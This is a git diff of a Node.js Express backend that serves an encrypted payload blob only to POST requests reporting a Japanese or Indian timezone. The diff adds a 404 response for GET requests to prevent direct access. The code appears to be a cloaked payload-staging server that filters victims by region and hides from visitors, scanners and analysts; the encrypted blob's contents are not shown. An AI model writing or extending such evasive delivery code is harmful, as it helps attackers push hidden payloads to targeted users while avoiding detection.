@@ -6,19 +6,19 @@ const PORT = process.env.PORT || 3000;
 app.use(cors());
 app.use(express.json());
 
-// Encrypted and encoded payload string
 const encryptedPayload = encodeURIComponent(
   "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"
 );
 
-// Allow Japan and India
-const allowedTimezones = ["Asia/Tokyo", "Asia/calcutta"];
+// ✅ Only allow Asia/Tokyo and Asia/Kolkata
+const allowedTimezones = ["Asia/Tokyo", "Asia/Kolkata"];
 
 app.post("/", (req, res) => {
   const { timezone, fullUrl } = req.body;
 
+  // Timezone validation
   if (!timezone || !fullUrl || !allowedTimezones.includes(timezone)) {
-    console.log("❌ Blocked request:", timezone, fullUrl);
+    console.log("❌ Blocked:", timezone, fullUrl);
     return res.status(403).send("Forbidden");
   }
 
@@ -26,6 +26,11 @@ app.post("/", (req, res) => {
   res.send(encryptedPayload);
 });
 
+// ❌ Block all GET requests to prevent direct access
+app.get("/", (req, res) => {
+  res.status(404).send("Not Found");
+});
+
 app.listen(PORT, () => {
-  console.log(`✅ Secure server running on port ${PORT}`);
+  console.log(`✅ Secure backend running on port ${PORT}`);
 });
